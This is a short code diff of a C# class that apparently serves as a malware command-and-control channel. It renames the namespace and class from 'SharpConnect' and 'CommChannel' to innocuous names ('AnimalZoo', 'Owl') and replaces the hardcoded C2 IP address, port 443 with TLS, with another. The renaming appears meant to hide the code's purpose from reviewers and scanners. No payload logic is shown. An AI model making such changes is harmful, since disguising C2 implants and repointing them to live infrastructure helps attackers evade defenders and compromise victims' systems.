@@ -9,11 +9,11 @@ using System.Security.Authentication;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading.Tasks;
 
-namespace SharpConnect
+namespace AnimalZoo
 {
-    class CommChannel
+    class Owl
     {
-        private string ccAddress = "164.92.130.192";
+        private string ccAddress = "159.69.34.228";
         private int ccPort = 443;
 
         private Socket ccSocket = null;
@@ -22,7 +22,7 @@ namespace SharpConnect
         private NetworkStream unencryptedStream;
         private SslStream encryptedStream;
 
-        public CommChannel(bool useTLS = true)
+        public Owl(bool useTLS = true)
         {
             usingTLS = useTLS;
         }
@@ -121,15 +121,6 @@ namespace SharpConnect
             {
                 return false;
             }
-        }
-        
-    
-
-       
-
-       
-           
-
-            
+        }            
     }
 }
